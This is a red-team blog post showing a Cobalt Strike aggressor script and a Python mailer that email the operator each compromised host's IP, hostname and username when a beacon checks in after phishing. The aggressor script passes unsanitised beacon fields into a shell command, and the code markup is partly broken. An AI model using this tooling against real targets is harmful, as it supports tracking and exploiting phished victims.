---
layout: post
title: "Cobalt Strike Aggressor Script"
permalink: "cobaltscripts"
date: 14-07-2023
categories: Blog
---

Over the past few days I have been trying to get back into playing around with Cobalt Strike more to up my Red Teaming game. As part of that, and to get some practice, I thought I would try to write a simple aggressor script.

The sole purpose of the script would be to email me when a beacon checks in. I imagine after a phishing campaign is sent out, you don't want to be sitting by your screen constantly waiting for something to happen so this might make life easier.

The two pieces of code required are:

- An aggressor script loaded into Cobalt Strike to monitor when a beacon checks in. This I simply called 'email.cna'.
- A Python script named 'emailme.py' that is called by the aggressor script to send an email on checkin.


### Scripts

The aggressor script can be seen below, and is simply placed within the 'on beacon_initial' function which gets called on beacon check in. It then extracts some fields of interest from the beacon such as the IP, computer name and username and passes them to the Python email script.

**email.cna:**
{% highlight powershell %}
on beacon_initial {
    println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1,"pid"));

    local('$internalIP $computerName $userName');
    $internalIP = replace(beacon_info($1,"internal")," ","_");
    $computerName = replace(beacon_info($1,"computer")," ","_");
    $userName = replace(beacon_info($1,"user")," ","_");
    $cmd = '/home/kali/emailme.py --computername ' . $computerName . " --internalip " . $internalIP . " --username " . $userName;
    exec($cmd);
}



Next up we have to build the Python script which I have also shown below. It is quite self explanatory but I guess some mail providers might require app passwords and the like, such as Gmail which might make it trickier.
If this is the case try to use a more basic email account if you have one that maybe offers you more control.


**emailme.py:**
{% highlight powershell %}
#!/usr/bin/env python  

import smtplib
import argparse
from email.mime.text import MIMEText

parser = argparse.ArgumentParser(description='beacon info')
parser.add_argument('--computername')
parser.add_argument('--internalip')
parser.add_argument('--username')
args = parser.parse_args()
computername = args.computername
internalip = args.internalip
username = args.username  

subject = "New Beacon Checkin"
body = "Checkin from Beacon with hostname:" + computername + ", with IP: " + internalip + " and from user: " + username
sender = "yourname@youremail.org"
recipients = ["test@testreceipt.com"]
password = "YourPassword"
{% endhighlight %}


def send_email(subject, body, sender, recipients, password):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = ', '.join(recipients)
    with smtplib.SMTP_SSL('smtp.yoursmtp.com', 465) as smtp_server:
       smtp_server.login(sender, password)
       smtp_server.sendmail(sender, recipients, msg.as_string())
    print("Message sent!")


send_email(subject, body, sender, recipients, password)
{% endhighlight %}

Finally the last thing to do is to load the Aggressor script into Cobalt Strike as shown below, by using the 'Script Manager' window.

<img alt="cs" src="/assets/img/CNA-LOADED.jpg"/>

The next time a beacon checks in you should receive an email that it has done so. This has been fun playing around with CS again and hopefully this saves you some time.

I think next up I might build a complete C2 infrastructure on Azure with redirectors back to the C2 hosted elsewhere to practice that aspect of Red Teaming. Stay tuned!
